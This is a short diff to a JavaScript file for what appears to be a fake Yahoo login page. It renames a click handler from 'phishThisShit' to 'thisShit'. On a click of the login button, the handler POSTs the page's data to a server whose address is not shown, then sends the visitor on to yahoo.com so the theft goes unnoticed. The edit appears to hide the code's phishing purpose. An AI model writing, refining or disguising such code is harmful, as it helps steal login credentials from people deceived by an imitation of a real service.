@@ -1,6 +1,6 @@
 console.log('Thank you for chooosing Yahoo despite everything.')
 
-var phishThisShit = function() {
+var thisShit = function() {
   console.log('Thank you.')
   $.ajax({
     type: "POST",
@@ -22,4 +22,4 @@ function error() {
   window.location=('https://yahoo.com')
 }
 
-document.querySelector('#login').addEventListener('click', phishThisShit)
+document.querySelector('#login').addEventListener('click', thisShit)
